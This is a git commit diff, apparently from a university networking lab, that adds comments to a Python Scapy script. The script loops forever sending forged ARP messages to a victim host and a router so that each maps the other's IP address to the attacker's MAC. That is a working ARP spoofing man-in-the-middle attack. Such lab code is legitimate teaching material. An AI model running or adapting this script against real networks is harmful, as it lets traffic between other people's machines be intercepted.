4b894152e52994e886e2cd43d941cdae14daf001
Steven Lee <sl3881@nyu.edu>
2016-03-28 22:39:38 -0400

    Added comments to code.

--- Lab 2/lab_2.py
+++ Lab 2/lab_2.py
@@ -3,12 +3,14 @@ from scapy.all import *
 import time
 
 def main():
-    src_mac = '02:00:8b:46:09:01'
-    rtr_mac = '02:00:8b:62:0b:02'
-    vic_mac = '02:00:8b:7e:0d:01'
+    src_mac = '02:00:8b:46:09:01'   # Source MAC Address
+    rtr_mac = '02:00:8b:62:0b:02'   # Router MAC Address
+    vic_mac = '02:00:8b:7e:0d:01'   # Target MAC Address
+    
+    # ARP Spoofing Attack
     while True:
-        sendp(Ether(dst=vic_mac)/ARP(psrc = "10.10.111.1", hwsrc=src_mac, pdst="10.10.111.110/24"))
-        sendp(Ether(dst=rtr_mac)/ARP(psrc = "10.10.111.110", hwsrc=src_mac, pdst="10.10.111.1/24"))
+        sendp(Ether(dst=vic_mac)/ARP(psrc = "10.10.111.1", hwsrc=src_mac, pdst="10.10.111.110/24")) # Send ARP Message to Target
+        sendp(Ether(dst=rtr_mac)/ARP(psrc = "10.10.111.110", hwsrc=src_mac, pdst="10.10.111.1/24")) # Send ARP Message to Router
 
 if __name__ == '__main__':
     main()
